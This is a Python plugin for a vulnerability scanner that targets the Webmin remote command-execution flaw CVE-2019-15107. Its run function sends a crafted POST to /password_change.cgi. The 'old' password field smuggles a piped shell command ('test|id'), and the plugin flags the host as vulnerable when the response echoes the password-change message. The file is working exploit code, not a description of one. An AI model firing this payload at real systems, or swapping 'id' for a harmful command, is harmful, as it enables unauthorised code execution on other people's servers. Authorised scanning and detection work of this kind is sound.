#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = ["https://blog.csdn.net/qq_51459600/article/details/122310548"]
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = 'Webmin命令执行(cve-2019-15107)漏洞'
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
    ret = msg()
    target = "/password_change.cgi"
    url1 = url + target
    headers = {
    'Accept-Encoding': "gzip, deflate",
    'Accept': "*/*",
    'Accept-Language': "en",
    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    'Connection': "close",
    'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
    'Referer': "%s/session_login.cgi"%url,
    'Content-Type': "application/x-www-form-urlencoded",
    'Content-Length': "60",
    'cache-control': "no-cache"
    }
    payload="user=rootxx&pam=&expired=2&old=test|%s&new1=test2&new2=test2" % 'id'
    try:
        res = requests.post(url=url1, headers=headers, data=payload, verify=False)
        if res.status_code ==200 and "The current password is " in res.text: 
            ret['ifbug'] = True
            res.close()
            return ret
        else:
            return ret
    except:
        return ret
        